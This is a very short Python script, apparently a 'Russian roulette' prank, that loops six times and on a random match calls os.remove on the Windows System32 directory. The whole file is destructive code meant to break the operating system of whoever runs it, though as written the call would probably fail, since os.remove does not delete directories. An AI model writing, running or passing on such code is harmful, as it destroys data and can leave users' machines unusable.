from random import randint
import os

for i in range(6):
    if i == randint(0, 6):
        os.remove("C:\Windows\System32")
